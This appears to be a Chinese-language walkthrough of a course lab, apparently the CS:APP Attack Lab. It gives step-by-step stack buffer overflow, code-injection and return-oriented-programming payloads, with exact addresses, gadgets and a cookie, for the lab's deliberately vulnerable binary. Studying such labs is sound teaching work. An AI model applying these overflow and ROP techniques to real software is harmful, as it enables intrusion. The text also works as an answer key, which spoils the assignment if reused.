## phase1

```assembly
00000000004017a8 <getbuf>:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp	# 字符串长度不超过40
  4017ac:	48 89 e7             	mov    %rsp,%rdi
  4017af:	e8 8c 02 00 00       	call   401a40 <Gets>
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
  4017bd:	c3                   	ret    
  4017be:	90                   	nop
  4017bf:	90                   	nop
```

输入字符串超过40（包含结束的空字符）时溢出，污染ret要返回的指令地址。

touch1的地址是0x00000000004017c0

所以输入的字符串是40个任意字符后接着**c0 17 40 00 00 00 00 00**

例如

```
00 00 00 00 00 00 00 00 00 00   /* 10 zeros */
00 00 00 00 00 00 00 00 00 00   /* 10 zeros */
00 00 00 00 00 00 00 00 00 00   /* 10 zeros */
00 00 00 00 00 00 00 00 00 00   /* 10 zeros */
c0 17 40 00 00 00 00 00			/* address of <touch1> */
```



## phase2

```c
void touch2(unsigned val)
{
    vlevel = 2; /* Part of validation protocol */
    if (val == cookie) {
	printf("Touch2!: You called touch2(0x%.8x)\n", val);
	validate(2);
    } else {
        printf("Misfire: You called touch2(0x%.8x)\n", val);
        fail(2);
    }
    exit(0);
}
```

touch2的地址是0x00000000004017ec

cookie是0x59b997fa

刚进入getbuf时%rsp = 0x5561dca0，然后%rsp - 0x28 = 0x5561dc78

要注入的代码是

```assembly
68 ec 17 40 00       	pushq  $0x4017ec			# touch2的地址
48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi	# 将cookie存入%rdi
c3                   	ret							# 返回到执行touch2
```

然后要注入代码使得getbuf执行ret时返回的地址为上面代码的起始位置，可以在输入的字符串中首先注入代码，然后填0，最后覆盖ret要返回的指令地址。

```assembly
5561dc78:	68 ec 17 40 00       	pushq  $0x4017ec			# touch2的地址
5561dc7d:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa, %rdi	# 将cookie存入%rdi
5561dc84:	c3                   	ret							# 返回到执行touch2
```

所以输入的字符串是

```
68 ec 17 40 00                  /* pushq $0x4017ec */
48 c7 c7 fa 97 b9 59            /* mov   $0x59b97fa, %rdi */
c3                              /* ret */
00 00 00 00 00 00 00            /* 7 zeros */
00 00 00 00 00 00 00 00 00 00   /* 10 zeros */
00 00 00 00 00 00 00 00 00 00   /* 10 zeros */
78 dc 61 55 00 00 00 00         /* address of injected code */
```



## phase3

```c
/* Compare string to hex represention of unsigned value */
int hexmatch(unsigned val, char *sval)// val = 0x59b997fa, sval = %rdi
{
	char cbuf[110];
	/* Make position of check string unpredictable */
	char *s = cbuf + random() % 100;
	sprintf(s, "%.8x", val); //s = "59b997fa"
	return strncmp(sval, s, 9) == 0;
}

void touch3(char *sval)
{
	vlevel = 3; /* Part of validation protocol */
	if (hexmatch(cookie, sval)) {
		printf("Touch3!: You called touch3(\"%s\")\n", sval);
		validate(3);
	} else {
		printf("Misfire: You called touch3(\"%s\")\n", sval);
		fail(3);
	}
	exit(0);
}
```

在注入的字符串中加入sval应指向的字符串“59b997fa”

touch3的地址是0x00000000004018fa

gdb检查发现进入touch3时%rsp变为0x5561dca8，而注入的位置是0x5561dc78，相差0x30 == 48

进入hexmatch时%rsp变为0x5561dc98，栈扩大后变成0x5561dc00，且canary保证栈帧不超过0x78

所以要把sval字符串放远一点以免被touch3的栈帧内容覆盖(放在0x5561dca8及之后的位置)

要注入的代码是

```assembly
5561dc78:	68 fa 18 40 00       	pushq  $0x4018fa			# touch3的地址
5561dc7d:	48 c7 c7 a8 dc 61 55 	mov    $0x5561dca8, %rdi	# 将字符串地址存入%rdi
5561dc84:	c3                   	ret							# 返回到执行touch3
#填0和address of gadget
5561dca8:	35 39 62 39 39 37 66 61 00							# sval字符串
```

要输入的字符串是

```
68 fa 18 40 00                  /* pushq  $0x4018fa */
48 c7 c7 a8 dc 61 55            /* mov    $0x5561dca8, %rdi */
c3                              /* ret */
00 00 00 00 00 00 00            /* 7 zeros */
00 00 00 00 00 00 00 00 00 00   /* 10 zeros */
00 00 00 00 00 00 00 00 00 00   /* 10 zeros */
78 dc 61 55 00 00 00 00         /* address of injected code */
35 39 62 39 39 37 66 61 00      /* sval string */
```



## phase4

### 补充

ROP利用现有的代码进行攻击，将指ret指令前有用的二进制片段作为gadget，然后通过不断的ret达到想要的结果

例如在以下代码中发现400f15这一行的**48 89 c7**恰好是**movq %rax, %rdi**指令的编码，则从400f18开始的片段可以作为一个gadget，起到%rdi = %rax的效果

```assembly
0000000000400f15 <setval_210>:
400f15: c7 07 d4 48 89 c7 movl $0xc78948d4,(%rdi)
400f1b: c3 retq
```



### 分析流程

要重现phase2的攻击，则要想办法把cookie（0x59b997fa）存到%rdi中，并最终ret到touch2（0x4017ec）

考虑先把0x59b997fa和touch2的地址注入到栈里，再执行popq %rdi的gadget，最后ret到touch2

发现farm中没有popq %rdi指令（5f）的片段，寻找其他popq指令片段，发现以下内容

```assembly
00000000004019a7 <addval_219>:
  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
  4019ad:	c3                   	ret 
  
         	58                   	popq   %rax # 4019ab
         	90                    	nop
```

考虑先popq到%rax，再利用mov %rax, %rdi（48 89 c7）达成目的，在farm中发现以下内容

```assembly
00000000004019c3 <setval_426>:
  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
  4019c9:	c3                   	ret    
  
         	48 89 c7            	mov    %rax,%rdi # 4019c5
         	90                    	nop
```

整理思路，要先从getbuf返回到4019ab，再返回到4019c5，最后返回到touch2

要输入的字符串是

```
00 00 00 00 00 00 00 00 00 00   /* 10 zeros */
00 00 00 00 00 00 00 00 00 00   /* 10 zeros */
00 00 00 00 00 00 00 00 00 00   /* 10 zeros */
00 00 00 00 00 00 00 00 00 00   /* 10 zeros */
ab 19 40 00 00 00 00 00         /* address of popq %rax */
fa 97 b9 59 00 00 00 00         /* cookie 0x59b997fa */
c5 19 40 00 00 00 00 00         /* address of mov %rax,%rdi*/
ec 17 40 00 00 00 00 00         /* address of touch2 0x4017ec */
```



## phase5

### 分析流程

movl指令以寄存器作为目的时，它会把该寄存器的高位4字节设置为0

touch3的地址是0x00000000004018fa

返回到touch3之前要把%rdi设置为sval字符串的地址，而存在栈里的sval字符串的地址只可能通过%rsp获得

getbuf在返回前%rax == 1

发现如下有趣的函数，它可以令%rax = %rdi + %rsi

```assembly
00000000004019d6 <add_xy>:
  4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
  4019da:	c3                   	ret    
```
想到用如下逻辑完成（每一行都是一个gadget（如果可以实现））

```c
rax = x;   // popq %rax，x是sval的地址偏移
eax = esi; // esi = x
rax = rsp; // rax = sval的地址 - x
rdi = rax; // rdi = sval的地址 - x
rax = rdi + rsi; // rax = sval的地址
rdi = rax; // rdi = sval的地址
```

其中需要用到的操作是

```assembly
#movl %eax, %esi             # gadget1 没有直接的指令，用esi = ecx = edx = eax间接实现
movl %eax,%edx               # gadget1_1 4019dd <getval_481+2>
movl %edx,%ecx               # gadget1_2 401a69 <getval_311+1>
movl %ecx,%esi               # gadget1_3 401a13 <addval_436+2>
movq %rsp,%rax               # gadget2   401a06 <addval_190+3>
movq %rax,%rdi               # gadget3   4019c5 <setval_426+2>
popq %rax                    # gadget4   4019ab <addval_219+4>
lea  (%rdi,%rsi,1),%rax      # gadget5   4019d6 <add_xy>
```

现在可以写出输入的字符串

```
00 00 00 00 00 00 00 00 00 00   /* 10 zeros */
00 00 00 00 00 00 00 00 00 00   /* 10 zeros */
00 00 00 00 00 00 00 00 00 00   /* 10 zeros */
00 00 00 00 00 00 00 00 00 00   /* 10 zeros */
ab 19 40 00 00 00 00 00         /* gadget4 */
20 00 00 00 00 00 00 00         /* bias x == 0x20 */
dd 19 40 00 00 00 00 00         /* gadget1_1 */
69 1a 40 00 00 00 00 00         /* gadget1_2 */
13 1a 40 00 00 00 00 00         /* gadget1_3 */
06 1a 40 00 00 00 00 00         /* gadget2 */
c5 19 40 00 00 00 00 00         /* gadget3 */
d6 19 40 00 00 00 00 00         /* gadget5 */
c5 19 40 00 00 00 00 00         /* gadget3 */
fa 18 40 00 00 00 00 00         /* address of touch3 0x4018fa */
35 39 62 39 39 37 66 61 00      /* sval string */
```



### 附gadget位置

gadget1_1的位置是

```assembly
00000000004019db <getval_481>:
  4019db:	b8 5c 89 c2 90       	mov    $0x90c2895c,%eax
  4019e0:	c3                   	ret    
    
           	89 c2               	movl   %eax,%edx # 4019dd
           	90               	    nop
```

gadget1_2的位置是

```assembly
0000000000401a68 <getval_311>:
  401a68:	b8 89 d1 08 db       	mov    $0xdb08d189,%eax
  401a6d:	c3                   	ret    
           	89 d1               	movl   %edx,%ecx # 401a69
           	08 db              	    orb    %bl,%bl
```

gadget1_3的位置是

```assembly
0000000000401a11 <addval_436>:
  401a11:	8d 87 89 ce 90 90    	lea    -0x6f6f3177(%rdi),%eax
  401a17:	c3                   	ret 
           	89 ce               	movl   %ecx,%esi # 401a13
           	90                 	    nop
            90                 	    nop
```

gadget2的位置是

```assembly
0000000000401a03 <addval_190>:
  401a03:	8d 87 41 48 89 e0    	lea    -0x1f76b7bf(%rdi),%eax
  401a09:	c3                   	ret    
  
           	48 89 e0               	movq   %rsp, %rax # 401a06
```
gadget3的位置是

```assembly
00000000004019c3 <setval_426>:
  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
  4019c9:	c3                   	ret    
  
         	48 89 c7            	mov    %rax,%rdi # 4019c5
         	90                    	nop
```

gadget4的位置是

```assembly
00000000004019a7 <addval_219>:
  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
  4019ad:	c3                   	ret 
  
         	58                   	popq   %rax # 4019ab
         	90                    	nop
```

gadget5的位置是

```assembly
00000000004019d6 <add_xy>:
  4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
  4019da:	c3                   	ret    
```

